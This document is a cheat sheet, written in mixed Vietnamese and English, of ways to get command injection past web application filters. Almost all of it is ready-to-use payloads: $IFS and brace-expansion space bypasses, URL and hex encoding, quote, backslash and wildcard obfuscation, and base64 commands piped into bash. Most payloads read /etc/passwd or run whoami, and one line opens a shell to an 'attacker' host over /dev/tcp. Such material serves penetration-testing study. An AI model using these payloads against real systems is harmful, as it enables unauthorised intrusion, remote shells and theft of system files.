# Command Injection Filter Bypass

## Overview

Web applications thường implement filters để ngăn Command Injection. Document này cover các kỹ thuật bypass phổ biến.

## Filter Analysis Methodology

Trước khi bypass, cần hiểu filter hoạt động như thế nào:

| Question | Implication |
|----------|-------------|
| Filter client-side hay server-side? | Client-side dễ bypass hoàn toàn |
| Filter special characters hay commands? | Quyết định bypass technique |
| Allowlist hay blocklist? | Blocklist thường có gaps |
| Regex-based hay string matching? | Regex có thể bị bypass với encoding |
| OS nào đang chạy? | Linux/Windows có commands khác nhau |

## Space Bypass Techniques

Khi space (` `) bị filter:

### Using $IFS (Internal Field Separator)

```bash
# $IFS mặc định chứa space, tab, newline
cat${IFS}/etc/passwd
ls${IFS}-la

# Variations
cat$IFS/etc/passwd
{cat,/etc/passwd}
```

### Using Tab Character

```bash
# Tab thay thế space (URL encoded: %09)
;ls%09-la%09/home
cat%09/etc/passwd
```

### Using Brace Expansion

```bash
# {cmd,args} expands to "cmd args"
{cat,/etc/passwd}
{ls,-la,/home}
{ping,-c,4,127.0.0.1}
```

### Input Redirection

```bash
# < không cần space
cat</etc/passwd
sh</dev/tcp/attacker/4444
```

### ANSI-C Quoting

```bash
# \x20 = space character
X=$'cat\x20/etc/passwd'&&$X
cmd=$'whoami'&&$cmd
```

### Windows Space Bypass

```cmd
# Environment variable substring
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

## Special Characters Filter Bypass

### URL Encoding

| Character | URL Encoded |
|-----------|-------------|
| `;` | `%3b` |
| `\|` | `%7c` |
| `&` | `%26` |
| space | `%20` |
| tab | `%09` |
| newline | `%0a` |
| `'` | `%27` |
| `"` | `%22` |

```bash
# Ví dụ
;whoami     → %3bwhoami
|whoami     → %7cwhoami
& whoami    → %26%20whoami
```

### Double URL Encoding

```bash
# Khi app decode 2 lần
; → %3b → %253b
| → %7c → %257c
```

### Environment Variable Character Extraction

**Linux:**

```bash
# Extracting / from PATH
${PATH:0:1}     # = /

# Extracting ; from LS_COLORS  
${LS_COLORS:10:1}   # = ;

# Full example: /etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

**Windows CMD:**

```cmd
# Extract \ from HOMEPATH
%HOMEPATH:~6,1%     # = \

# PowerShell
$env:HOMEPATH[0]    # = \
```

### Using tr Command

```bash
# Convert characters
echo . | tr '!-0' '"-1'     # = /
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## Command Obfuscation

### Quote Insertion (Linux)

```bash
# Quotes inserted don't affect execution
w'h'o'am'i          # = whoami
wh''oami            # = whoami
'w'hoami            # = whoami
w"h"o"am"i          # = whoami
wh""oami            # = whoami

# Lưu ý: số single quotes phải chẵn
```

### Quote Insertion (Windows CMD)

```cmd
# Double quotes
w"h"o"am"i          # = whoami

# Caret character
who^ami             # = whoami
wh^oa^mi            # = whoami
```

### Backslash Insertion (Linux)

```bash
# Backslash không affect command
w\ho\am\i           # = whoami
/\b\i\n/////s\h     # = /bin/sh
ca\t /et\c/pas\swd  # = cat /etc/passwd
```

### $@ Insertion

```bash
# $@ expands to nothing in some contexts
who$@ami            # = whoami
ca$@t /etc/passwd   # = cat /etc/passwd
```

### $() Empty Insertion

```bash
# Empty $() doesn't add anything
who$()ami           # = whoami
who$(echo)ami       # = whoami
who`echo`ami        # = whoami
```

### Backtick Insertion

```bash
# Empty backticks
wh``oami            # = whoami
ca``t /etc/passwd   # = cat /etc/passwd
```

## Encoding Techniques

### Hex Encoding (Linux)

```bash
# Echo hex encoded string
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
# = /etc/passwd

# Use in command
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

# ANSI-C quoting
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
```

### xxd Hex Decoding

```bash
# xxd để decode hex
xxd -r -p <<< 2f6574632f706173737764
# = /etc/passwd

cat `xxd -r -p <<< 2f6574632f706173737764`
```

### Base64 Encoding

```bash
# Encode: whoami → d2hvYW1p
echo -n 'whoami' | base64

# Execute encoded command
bash<<<$(base64 -d<<<d2hvYW1p)
echo d2hvYW1p | base64 -d | bash
```

## Case Modification

### Windows (Case Insensitive)

```cmd
# Windows không phân biệt hoa thường
WhOaMi
WHOAMI
wHoAmI
```

### Linux (Character Shifting)

```bash
# Translate uppercase to lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

## Newline and Line Return Bypass

### Newline (\n, %0a)

```bash
# Commands separated by newline
original_cmd
whoami

# URL encoded
original_cmd%0awhoami
```

### Carriage Return (\r, %0d)

```bash
# Sometimes works
cmd%0d%0awhoami
```

### Backslash-Newline Continuation

```bash
# Command continues on next line
cat /et\
c/pa\
sswd

# URL encoded
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Brace Expansion Techniques

```bash
# Basic expansion
{,ip,a}             # expands to: ip a
{,ifconfig}         # expands to: ifconfig
{,ls,-la}           # expands to: ls -la

# With wildcards
{,/?s?/?i?/c?t,/e??/p??s??,}
# Matches: /usr/bin/cat /etc/passwd

# Command execution
{,$"whoami",}
```

## Wildcard Bypass

### Linux Wildcards

```bash
# ? = any single character
/???/??t /???/p??s??
# = /bin/cat /etc/passwd

/???/c?t /e?c/p?s?w?
# = /bin/cat /etc/passwd

# * = any characters
/bin/ca* /etc/pas*
```

### Windows Wildcards

```powershell
# PowerShell wildcards
C:\*\*2\n??e*d.*?           # notepad
@^p^o^w^e^rshell c:\*\*32\c*?c.e?e   # calc
```

## Tilde Expansion

```bash
# ~ = home directory
echo ~                  # /home/user
echo ~+                 # current directory (pwd)
echo ~-                 # previous directory
```

## Variable Expansion Tricks

```bash
# Pattern replacement
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
# = cat /etc/passwd

# Remove pattern
cat ${test//hh??hm/}
```

## Combined Bypass Examples

### Example 1: Space + Command Filter

```bash
# Original blocked: cat /etc/passwd
{cat,/etc/passwd}                       # Brace expansion
cat${IFS}/etc/passwd                    # IFS
c'a't${IFS}/e't'c/pa's'swd             # Quotes + IFS
```

### Example 2: Multiple Filters

```bash
# Combining techniques
;{c'a't,${PATH:0:1}e't'c${PATH:0:1}p'a's's'wd}
```

### Example 3: Heavy Obfuscation

```bash
# Complex bypass
X=$'cat\x20/etc/passwd'&&$X

# Quote insertion + variable
c''at /e""tc/pa''ss''wd
```

## Quick Reference Table

| Technique | Blocked | Bypass |
|-----------|---------|--------|
| Space | `cat /etc` | `cat${IFS}/etc`, `{cat,/etc}` |
| Semicolon | `; whoami` | `%3b whoami`, `%0a whoami` |
| Pipe | `\| id` | `%7c id` |
| Command | `whoami` | `w'h'o'am'i`, `wh\oami` |
| Slash | `/etc` | `${PATH:0:1}etc` |
| Quotes | `'test'` | Hex: `\x27test\x27` |
| Keywords | `cat` | `c''at`, `c\at`, Base64 |
